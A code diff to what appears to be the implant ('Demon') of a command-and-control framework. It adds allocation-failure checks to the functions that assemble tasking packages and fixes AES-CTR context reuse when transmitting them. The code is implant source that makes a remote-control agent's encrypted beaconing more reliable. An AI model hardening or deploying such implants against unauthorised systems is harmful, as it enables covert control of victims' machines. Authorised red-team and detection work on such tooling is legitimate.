@@ -60,6 +60,10 @@ VOID PackageAddInt32(
             LMEM_MOVEABLE
     );
 
+    if ( ! Package->Buffer ) {
+        return;
+    }
+
     Int32ToBuffer( Package->Buffer + Package->Length, Data );
 
     Package->Length += sizeof( UINT32 );
@@ -76,6 +80,10 @@ VOID PackageAddInt64( PPACKAGE Package, UINT64 dataInt )
             Package->Length + sizeof( UINT64 ),
             LMEM_MOVEABLE
     );
+
+    if ( ! Package->Buffer ) {
+        return;
+    }
 
     Int64ToBuffer( Package->Buffer + Package->Length, dataInt );
 
@@ -95,6 +103,10 @@ VOID PackageAddBool(
             Package->Length + sizeof( UINT32 ),
             LMEM_MOVEABLE
     );
+
+    if ( ! Package->Buffer ) {
+        return;
+    }
 
     Int32ToBuffer( Package->Buffer + Package->Length, Data ? 1 : 0 );
 
@@ -117,6 +129,10 @@ VOID PackageAddPad( PPACKAGE Package, PCHAR Data, SIZE_T Size )
             LMEM_MOVEABLE | LMEM_ZEROINIT
     );
 
+    if ( ! Package->Buffer ) {
+        return;
+    }
+
     MemCopy( Package->Buffer + ( Package->Length ), Data, Size );
 
     Package->Length += Size;
@@ -133,10 +149,14 @@ VOID PackageAddBytes( PPACKAGE Package, PBYTE Data, SIZE_T Size )
     if ( Size )
     {
         Package->Buffer = Instance->Win32.LocalReAlloc(
-            Package->Buffer,
-            Package->Length + Size,
-            LMEM_MOVEABLE | LMEM_ZEROINIT
+                Package->Buffer,
+                Package->Length + Size,
+                LMEM_MOVEABLE | LMEM_ZEROINIT
         );
+
+        if ( ! Package->Buffer ) {
+            return;
+        }
 
         MemCopy( Package->Buffer + Package->Length, Data, Size );
 
@@ -151,6 +171,10 @@ VOID PackageAddString( PPACKAGE package, PCHAR data )
 
 VOID PackageAddWString( PPACKAGE package, PWCHAR data )
 {
+    if ( ! data ) {
+        return;
+    }
+
     PackageAddBytes( package, (PBYTE) data, StringLengthW( data ) * 2 );
 }
 
@@ -159,7 +183,15 @@ PPACKAGE PackageCreate( UINT32 CommandID )
     PPACKAGE Package = NULL;
 
     Package            = Instance->Win32.LocalAlloc( LPTR, sizeof( PACKAGE ) );
+    if ( ! Package ) {
+        return NULL;
+    }
+
     Package->Buffer    = Instance->Win32.LocalAlloc( LPTR, sizeof( BYTE ) );
+    if ( ! Package->Buffer ) {
+        Instance->Win32.LocalFree( Package );
+        return NULL;
+    }
     Package->Length    = 0;
     Package->RequestID = Instance->CurrentRequestID;
     Package->CommandID = CommandID;
@@ -175,6 +207,10 @@ PPACKAGE PackageCreateWithMetaData( UINT32 CommandID )
 {
     PPACKAGE Package = PackageCreate( CommandID );
 
+    if ( ! Package ) {
+        return NULL;
+    }
+
     PackageAddInt32( Package, 0 ); // package length
     PackageAddInt32( Package, DEMON_MAGIC_VALUE );
     PackageAddInt32( Package, Instance->Session.AgentID );
@@ -187,6 +223,10 @@ PPACKAGE PackageCreateWithMetaData( UINT32 CommandID )
 PPACKAGE PackageCreateWithRequestID( UINT32 CommandID, UINT32 RequestID )
 {
     PPACKAGE Package = PackageCreate( CommandID );
+
+    if ( ! Package ) {
+        return NULL;
+    }
 
     Package->RequestID = RequestID;
 
@@ -355,6 +395,10 @@ BOOL PackageTransmitAll(
 
     Package = PackageCreateWithMetaData( DEMON_COMMAND_GET_JOB );
 
+    if ( ! Package ) {
+        return FALSE;
+    }
+
     // add all the packages we want to send to the main package
     while ( Pkg )
     {
@@ -401,7 +445,10 @@ BOOL PackageTransmitAll(
         PUTS_DONT_SEND("TransportSend failed!")
     }
 
-    // decrypt the package
+    // decrypt the package: re-init the context first, the counter has
+    // advanced past the whole buffer while encrypting and CTR keystream
+    // reuse would corrupt the restore
+    AesInit( &AesCtx, Instance->Config.AES.Key, Instance->Config.AES.IV );
     AesXCryptBuffer( &AesCtx, Package->Buffer + Padding, Package->Length - Padding );
 
     Entry = Instance->Packages;
